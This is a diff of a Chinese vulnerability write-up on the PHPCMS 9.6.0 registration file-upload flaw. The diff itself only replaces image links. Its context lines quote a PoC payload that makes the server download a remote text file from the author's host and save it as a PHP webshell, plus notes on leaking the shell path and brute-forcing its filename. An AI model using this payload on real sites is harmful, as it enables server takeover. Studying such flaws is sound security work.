@@ -56,7 +56,7 @@ PHPCMS 是一款网站管理软件。该软件采用模块化开发, 支持多�
 
 在注册用户处，添加用户进行抓包（这里以 Tao 为例）
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7jg7R2zcvR1su4JavaibxCTV3HjPe32BGfGn2qm5ZrKQ6M1nxdyLzhyw/640?wx_fmt=png)
+![](../../.resource/remote/88f0fec9458a1e8c671b1975bcabbfd9c97546a8a829d2c38dfb59981d9fefd4.png)
 
 ```
 #poc
@@ -66,13 +66,13 @@ siteid=1&modelid=11&username=Tao&password=123456&email=Tao@qq.com&info[content]=
 
 本次测试中, `http://www.tao.com/t.txt`文本内容如下：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7uPaqfgiagpuQtenZtgTguYSldGUicyKo4vK2A7basPiaIlS5qZlgicsUVg/640?wx_fmt=png)
+![](../../.resource/remote/b02f29c74fc637d18d4dcdf7a6bad7ad2086a702f03a7148517724919cf83099.png)
 
 修改，放包回显如下，然后我们访问该返回的 url
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7ibCNiaSko66iaRUgGZQc8iaFlptt1GnGibiaBZZJtatkhBb5dUe26kACZ8nw/640?wx_fmt=png)
+![](../../.resource/remote/3e2ac6d1cedee36ea9c46850286e4ce207154848ce0993b57702351133c10642.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x71PhGdj4J4BpbsOkjn91bFyoW7cc7CDEY0hmMkt8ByVcCBzmM3kmXBg/640?wx_fmt=png)
+![](../../.resource/remote/42419ce290fe558aa8e2e3e161c588478b3b43cb4c38b109ee136ca899402e38.png)
 
 利用成功！！！这里再贴个脚本
 
@@ -116,7 +116,7 @@ if __name__ == '__main__':
 
 运行效果如下图：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x79DaAk5SBvSGQRjDaOyic26GQHxiandnxZ5G1vibibvicFsZEbfRAcudwfPQ/640?wx_fmt=png)
+![](../../.resource/remote/f408b1db6ad5db24afc960f51f87570165ad03da5bd070d73bba5b5aa60da12b.png)
 
 漏洞分析
 ----
@@ -165,11 +165,11 @@ if($member_setting['choosemodel']) {
 
 > 这里留一个问题，为什么 47 行处获取的是`datetime`这个函数？
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7Xk4TC8IImDVCrfomiasibDXmhbmPs5STmlnRVy6BAicdgAH5RgOyhibzjg/640?wx_fmt=png)
+![](../../.resource/remote/e71c755a1f312074648490e1abd930afd6d4a0e03b3c95fb5b440e896f570ffb.png)
 
 跟进一下这个函数，代码如下：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7yicbneEiaYPSfugbV2Z55owKUnGznicwZbdZZvoyj9zOmUhgb672hVyoA/640?wx_fmt=png)
+![](../../.resource/remote/f52787e8aa570a7b9918f536ef47d73d74915bd1870cfd9609f4aa2ad862bf3f.png)
 
 上面代码执行完以后，返回`$value="2021-03-13"`, 然后返回`get`方法，执行
 
@@ -180,25 +180,25 @@ return $info;
 
 退出`get`方法，继续跟进，进入`ps_member_register`方法
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x79wtGaGdpRLIriaYv4k3XyfwiaRPcWiautaTCZXDrmvRyLNmaibSfoQ4wEw/640?wx_fmt=png)
+![](../../.resource/remote/f5b4737e6a4874c341f5e635c4b2ccfdd6965c0ed3ffac76347577a3f1f2b982.png)
 
 继续跟进，执行`insert`操作
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7j2rnI2iaaQfQB4fZc7FCY3T7eJMicCnjQTARu6eOoYkGxqM6RAxPLeVQ/640?wx_fmt=png)
+![](../../.resource/remote/01c8e63a2692b52cb542dfe28e2782a4cfee6c33672d73d6b1ef23797072bc55.png)
 
 `F7`跟进, 执行到下图，将注册信息插入数据库，注册完成。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7Qm9mWSLO4JGdXHAxUgE7RhqE7ichTQAvlYlOqs556lnbpcJuJibH10tQ/640?wx_fmt=png)
+![](../../.resource/remote/67c6924c17b0cc5802b9c1c91399f71767fc326c85a59c60b209d3deb50cc9e3.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7CmP1P5s6k5ibZrUaBR6o1A0Z3E0agybUh6UgZeibC2Y2U2gBhmA9nIhg/640?wx_fmt=png)
+![](../../.resource/remote/086fe8a63e04fe2539cb4cf8e706c22acdb6b8bba21f5d69419c553760001b62.png)
 
 之后返回到`register`函数
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7kiaxb0rYhXFdA5yic3tg0aJ6giaZMcaHic4mvXYdiaOy6TEmbib9oTQjA97g/640?wx_fmt=png)
+![](../../.resource/remote/d728a1c9b632b366b3038d751ac66abac6a717127e5be0498f5ecb9eff0448a1.png)
 
 当`$status > 0`时，执行`insert`操作，这里将`生日日期`和`用户id`插入到`v9_member_detail`表中
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7CmP1P5s6k5ibZrUaBR6o1A0Z3E0agybUh6UgZeibC2Y2U2gBhmA9nIhg/640?wx_fmt=png)
+![](../../.resource/remote/086fe8a63e04fe2539cb4cf8e706c22acdb6b8bba21f5d69419c553760001b62.png)
 
 ```
 INSERT INTO `phpcmsv96`.`v9_member_detail`(`birthday`,`userid`) VALUES ('2021-03-13'php,'26')
@@ -206,13 +206,13 @@ INSERT INTO `phpcmsv96`.`v9_member_detail`(`birthday`,`userid`) VALUES ('2021-03
 
 到这里，我们肯定还是不知道为什么上面调用的函数是`datetime`, 先不急，我们整理一下注册的执行流程：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7ibkD8SalC4oVMoermvV99hUHMO0CMGDAra8IP8wic6ltpibMfxvZbliaNQ/640?wx_fmt=png)
+![](../../.resource/remote/d6b77c777a08c37d2739101bb9db1aecd546c3e275c108e514e29bd2a5a4af4c.png)
 
 你是不是发现了什么？接下来我们来分析一下为什么`$func="datetime"`。
 
 首先由于`$func = $this->fields[$field]['formtype']`，我们按 ctrl 点击`$this->fields`，同一文件，第 11 行得到的，这里传了个`'model_field_'.$modelid`, 而`$modelid = 10`，跟进一下`getcache`方法
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7q5ibQKjqqH8naGYJxMuzLPflK0NSnA1LLMCrvlk00s1bXGFy2uFtTXQ/640?wx_fmt=png)
+![](../../.resource/remote/85ed7572c385ff1bbdcd6a666b89452a46adee33aabe1dd3bf517752ae3cc9e1.png)
 
 跳转至`phpsso_server/phpcms/libs/functions/global.func.php`文件，函数内容如下:
 
@@ -267,11 +267,11 @@ define('MEMCACHE_PORT', $this->cache_config[$cache_name]['port']);
 
 由于`$cache_name = 'file'`, 从而执行`$object = pc_base::load_sys_class('cache_file');`, 跟进一下`pc_base::load_sys_class`方法
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7SkSY2EL2xO9X5ntSRflff2pXViaa0Tibhu4woUiasuydvdy7BMzY6tDgA/640?wx_fmt=png)
+![](../../.resource/remote/818b1b9bd043584355eb8a508f78ecd3e2c10ee0eea6853b784e5a18c8380016.png)
 
 调用了`_load_class`类，继续进入
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7VN1seIY0DAxDgibDaqHUZwvscGA11SW3BxTAjDb5cBsFDYwzZf9yctw/640?wx_fmt=png)
+![](../../.resource/remote/7073ddecf38371be321987e14b84bcc9dd51901afdd51b1133490ba5a84072ee.png)
 
 122 行的代码不会执行，因为文件路劲中`没有自己的扩展文件`，`my_path`方法代码如下：
 
@@ -289,41 +289,41 @@ return false;
 
 上图执行到 130 行，返回了`cache_file`对象（因为`$name='cache_file'`），内容见下图：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7jsG1f7Sc0fkfx6GM1PCUvH3bxCm4ibfPibDrYGWFg3PcXIbWdQTa6p1g/640?wx_fmt=png)
+![](../../.resource/remote/6662e7e51a673c848c6bc0fbed39633bf886857ae3ae5ca2b58a5e145e5b312d.png)
 
 这里返回完了以后，退出到执行`phpsso_server/phpcms/libs/functions/global.func.php`中 548 行处`get`方法，代码如下：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7PjZqFqEwTibLiaPQGOms90ugzicYIYcmAvJ3Vv6ibaJoRZ9PibsZ4ZzWOug/640?wx_fmt=png)
+![](../../.resource/remote/cb6139269a1fc17a4f8d99e32decdfd5469c20bd43af0fd103f785eaa8adb76a.png)
 
 代码传入的参数`$name`就是下图的`'model_field_'.$modelid` = `'model_field_10'`：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7vdbic5NGicknz9aKFNX8ibWiaOCOeRSialiafOJIyyVk5QbKEf9Aa4Sj34Hg/640?wx_fmt=png)
+![](../../.resource/remote/766293d22d2453947186960baad3044bb3eae39b33c684dd9a69426b7243a2d0.png)
 
 看看 get 方法，可以发现，它包含了`/caches/caches_model/caches_data/model_field_10.cache.php`文件
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7coWRwnpV6ymWUEpNFfSmZ72e1YGhqSUoeFdtlzIMTat3E6fhib7gJNg/640?wx_fmt=png)
+![](../../.resource/remote/751bb95d4c920043f989dedfc5ef84a13bd6b1f0de6092414b549a48a9dc6f28.png)
 
 且 91 行返回了`/caches/caches_model/caches_data/model_field_10.cache.php`中的内容
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7hu24L4c0hmtPX3DO31x7ia2gDWaUnYCrl3gPKMnHRoJS2jRzArPM6HA/640?wx_fmt=png)
+![](../../.resource/remote/5ec934cdf6e25c0fff2b1b35bb9545ffcfe1e1fd2f698a86e0e99a6b56fc1690.png)
 
 内容如下：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7nIfXhrVaPHkNjGCusVZdTxrEEgEvYdyqibhEjo6POPjN2DKX51ibTyZA/640?wx_fmt=png)
+![](../../.resource/remote/b0c619124be402fbd9f3812e8f18cd8eed4f01eb840a23d2424abee4e0d30ef3.png)
 
 `$func = $this->fields[$field]['formtype'];` 对应此文件中`'formtype' => datetime`，因此这里`$func = datetime`。
 
 当然，这里数据也可以通过数据库中`v9_member_field`表获取。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7K7Fr58Q2DvibZb4Z686gsgfiaTYrpsgPKQCfQSBsCFhftk0oaA4vdPMQ/640?wx_fmt=png)
+![](../../.resource/remote/a45cab3147a28a6c338a4e40ed1ff6f3ac62070a6a1ff06d3ca735d059d1c286.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7TPGiaOFnPgqiaq4YttODVibDW22Fmybtpq1uVfrdcicVKxiaUgiaiaQAMR3NA/640?wx_fmt=png)
+![](../../.resource/remote/502d593c212e0f06e4220b835330025aec6744e97d7cf73d4dca4f1c4aaf6247.png)
 
 可能上面描述的不太直观，我们再次梳理一下获取`datetime`函数的流程：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x75thV2Qbvwb0uKTuYDJC9s6bXDC4yibUMe8zCgG8AR41O3hwMqdKUblg/640?wx_fmt=png)
+![](../../.resource/remote/fb0e3f7843ae4d40e1ecccde12910bb6ba33e52a72410af2200e561f40fc74cc.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x78qQRuP3Zfm7NUh6w3scOkFhKFM5OfWkpq3SBMficVxlsFDOleibcl1hw/640?wx_fmt=png)
+![](../../.resource/remote/0c947488902256a29b5366eb6f40106d8020312558cabd67acaf19e28c96950f.png)
 
 接下来我们分析 poc
 
@@ -331,15 +331,15 @@ return false;
 
 通过上面的分析，直接下断点到关键处
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7lrnzLMjuQffSG6iam2MmzrkRGytLMoW4vdS4OceO0sRDzGrCia1dWHwg/640?wx_fmt=png)
+![](../../.resource/remote/f15460268d4d7efdf40c4cc47e3c08ed72c3b36d225e0465e24ab11362ff9648.png)
 
 如上图，这里获取的是`editor`函数，而在这个函数中，有个`download`方法 (下图，文件在`caches/caches_model/caches_data/member_input.class.php`)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7lFwWq8q4ktdmwA8jzbNyjAOXVcd3eFm0tKAzcjHWWXwFfONv5icLtJw/640?wx_fmt=png)
+![](../../.resource/remote/3886e54f927785c45fb54dbdd47731c54fa4fd1e91055a59a2342dc5da21b3f3.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7dYJfI9LJAU3q1ADdHY2o3fLmicPdicC373Liah1bp4IMZBWEun2QNoyicA/640?wx_fmt=png)
+![](../../.resource/remote/40b54218a496827fc432488044123ff2037238c93268abc373dc7b7eea91ca5f.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7jabUayD2dMjesFxGYOoWD4mkfcwlBZTJ2I0EjGfr0XTGu1q8wmtibzA/640?wx_fmt=png)
+![](../../.resource/remote/309f64c7e690ff55893353f13568d5f7bcf68b2d642abe23e4699f3f7c14aa76.png)
 
 上面关键代码如下：
 
@@ -352,9 +352,9 @@ if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i",$string, $mat
 
 这个正则匹配不难理解，需要满足`href/src=url. (gif|jpg|jpeg|bmp|png)`，这就是为什么我们写`info[content]=<img src=http://www.tao.com/a.txt?.php#.jpg`（符合这个格式，而且加`.jpg`的原因），接着进入`fillurl`方法
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7DsexstL0fZDMC3DqZ6F06Em1DoUtpL1GeGfNlZKzmmYwarwJZOcSNQ/640?wx_fmt=png)
+![](../../.resource/remote/319ecb40b504ec4d987382d089483ac2c65a7753fc1b2908d8282d07aa36fdc6.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x70ODLmKmf9Py6oN0XSwWpicBiamW5YBQk48WeicmaIyOnrlebFwzSO8hWQ/640?wx_fmt=png)
+![](../../.resource/remote/fd65e095d18a274bae7212c2ac136630a6fb42dbe7c24a9ec66f9d4dffca1c7f.png)
 
 在上图的`fillurl`方法中, 通过下面代码去掉了锚点.
 
@@ -367,31 +367,31 @@ if($pos>0) $surl = substr($surl,0,$pos);
 
 继续执行，可以发现返回的 url 去掉了`#`后面的内容
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7aFEfHrpPDawEianyLs4sLJYQZU1ppEn9JxrkePHkofz2UpPODsAo7yQ/640?wx_fmt=png)
+![](../../.resource/remote/c0a73581b5130603fa2f7b428b96054eb0e42e64e6ecb0e379c8be76adf77e4f.png)
 
 下面 166 行处获取了上面返回 url 的后缀，及`php`, 通过`getname`方法进行重命名，可以发现的是，`getname`方法返回的文件名也只是时间 + 随机的三位数。如果不返回上传文件的 url 地址，也可以通过爆破获取。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7wGjcUZstfZcSRNdSAnDxHicOicV6NCfeJ0SicHwxRmibOicUdZmX0Ld5lfw/640?wx_fmt=png)
+![](../../.resource/remote/f95ed19ef3bee3ed23f962fb26a6d34b86636fe3230089ede6fdbf6112f87a8a.png)
 
 接着程序调用了`copy`函数, 对远程的 url 文件进行了下载
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7v8Io4cPP43kMfVzXS89aJyg37NPVKV64vwstqvqKODqEb8LDDnydSQ/640?wx_fmt=png)
+![](../../.resource/remote/ee8c7d580fe11494313720d41613e9c2b1f06738a03b7df26e785ad6f7f26747.png)
 
 这里的`$this->upload_func`是`copy`函数的原因, 是因为初始化时赋给的（看下图）
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7DJS3eEAgiaNEDFvYOoXyCcAA0otNRXLhV1INiccYURrq0UyyvjLRlLOg/640?wx_fmt=png)
+![](../../.resource/remote/b070c8e68f66b764713902e2dd576d79f118ca4fbbbc2afebb1015f8794e307f.png)
 
 此时能看到我们要写入的内容已经成功写入文件了。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x74JxwvnRILNOcWxIUicWQ3LmhJ93cG44gCjRF2BQpiac8ic2OfFrjmicFAw/640?wx_fmt=png)
+![](../../.resource/remote/4d7e27a0708aa4f64547a03abf08857bb45bd4c97873da7960bd68eab9d82a49.png)
 
 接着我们来看看写入文件的路劲是如何返回给我们的。上面程序执行完以后，回到了`register`函数中：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7iarWYKyDc1z9IlB9G7VsB1BCg4vwxNaiamD2mqw6sxMsKicbh920gF0iag/640?wx_fmt=png)
+![](../../.resource/remote/6aa35a7e0429f09c58a1b42b09083e79dd31155749941ef70e7774130611d531.png)
 
 F7 跟进
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7Rboic33IJkCSKn4ERLktvfLVnmZhAJ0NDzzhMkYkRhXyME2R6MR0fxQ/640?wx_fmt=png)
+![](../../.resource/remote/187eb3dfb30b1b38c3a18b4818035b1e84246a953e61842123b06f9ce501296f.png)
 
 ```
 INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES ('<img src=http://www.phpcms96.com/uploadfile/2021/0314/20210314103307168.php>','25')
@@ -399,7 +399,7 @@ INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES ('<img src
 
 可以发现，上上图 140 行处`$status > 0`时会执行上面的 SQL 语句，也就是向`v9_member_detail`的`content`和`userid`两列插入数据
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7nXRQ60iahcVjm42paibsPucH3WVvG6oZOAkwicrliaUSeUWmYyLmu196cg/640?wx_fmt=png)
+![](../../.resource/remote/0d7681417b65ab75543a1ab31338c8f6103400e0e254f1ce6a3f3cddeab27fd9.png)
 
 但是由于`v9_member_detail`表结构中没有`content`列，产生了报错。从而将插入数据中的 sql 报错语句 (包含 shell 路径) 返回了前台页面。
 
@@ -407,7 +407,7 @@ INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES ('<img src
 
 通过前面 139 行我们发现`$status`是由`client`类中`ps_member_register`方法返回的（函数路劲在：`phpcms/modules/member/classes/client.class.php` ）
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7aFuFn9EZOvvjcbQBqusD9bZQQVBXZeia9icHzicib6KtVzrOjGbln44MEQ/640?wx_fmt=png)
+![](../../.resource/remote/6fba687c502173fbb5c47ef2b8f71deb8278d2f81de2501c7d1b89a0c6549394.png)
 
 `$status <= 0`都是因为用户名和邮箱不唯一导致的，所以我们 payload 尽量要随机
 
@@ -415,7 +415,7 @@ INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES ('<img src
 
 在无法得到路径的情况下我们只能爆破了 ，文件名的生成方法 (在`phpcms/libs/classes/attachment.class.php`)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7wGjcUZstfZcSRNdSAnDxHicOicV6NCfeJ0SicHwxRmibOicUdZmX0Ld5lfw/640?wx_fmt=png)
+![](../../.resource/remote/f95ed19ef3bee3ed23f962fb26a6d34b86636fe3230089ede6fdbf6112f87a8a.png)
 
 返回的文件名也只是时间 + 随机的三位数。比较容易爆破的。
 
@@ -424,7 +424,7 @@ INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES ('<img src
 
 在 phpcms9.6.1 中修复了该漏洞，修复方案就是对用`fileext`获取到的文件后缀再用黑白名单分别过滤一次
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCeNIvnItP7vIiao2zKuZ6x7LMIR9pJ7k48mIgRFTWT7QZwT9uA2B62ZDEo3dkuHI3QF0275n8me1A/640?wx_fmt=png)
+![](../../.resource/remote/784cb00fcd9266a425da98173a2d1cac3253370272798519e0788eaa42373b36.png)
 
 文章中有什么不足和错误的地方还望师傅们指正。
 
